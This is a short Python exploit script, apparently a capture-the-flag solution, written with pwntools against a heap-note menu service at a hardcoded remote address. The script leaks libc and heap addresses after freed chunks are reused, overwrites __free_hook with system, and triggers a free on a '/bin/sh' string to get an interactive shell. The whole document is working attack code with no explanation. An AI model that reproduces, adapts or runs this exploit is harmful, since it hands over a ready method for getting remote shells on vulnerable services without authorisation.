#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "13.112.128.199"
port = 1337
for i in range(10):
    r = remote(host,port)

    def add(name,size,content):
        r.recvuntil(":")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(name)
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.send(content)

    def edit(idx,types,value,data):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(idx))
        r.recvuntil(":")
        r.sendline(str(types))
        r.recvuntil(":")
        r.sendline(str(value))
        r.recvuntil(":")
        r.send(data)

    def view():
        r.recvuntil(":")
        r.sendline("2")

    def delbug(idx):
        r.recvuntil(":")
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(idx))

    
    add("dada",128,"nogg") #1

    add("dada",128,"gogo") #2
    delbug(1)
    add("dada",32,"fuck") #3

    
    view()
    r.recvuntil("fuck")
    
    data = r.recvuntil("\n")[:-1]
    if len(data) < 4 :
        r.close()
        continue
    libc = u32(data) - 0x1b07f0
    print hex(libc)
    add("da",32,"sh\x00") #4
    add("da",32,"sh\x00") #5
    delbug(0)
    delbug(3)
    delbug(4)
    delbug(5)
    add("ora",32,"lays")
    view()
    r.recvuntil("lays")
    data = r.recvuntil("\n")[:-1]
    if len(data) < 4 :
        r.close()
        continue
    
    heap = u32(data) - 0x40
    print hex(heap) 
    obj = heap + 0x178
    free_hook = libc +0x1b18b0
    system = libc + 0x3a940
    off = free_hook - obj - 0x100000000
    
    add("sh\x00",0x21000,"/bin/sh\x00")
    edit(2,3,off,p32(system))
    delbug(7) 
    
    r.interactive()
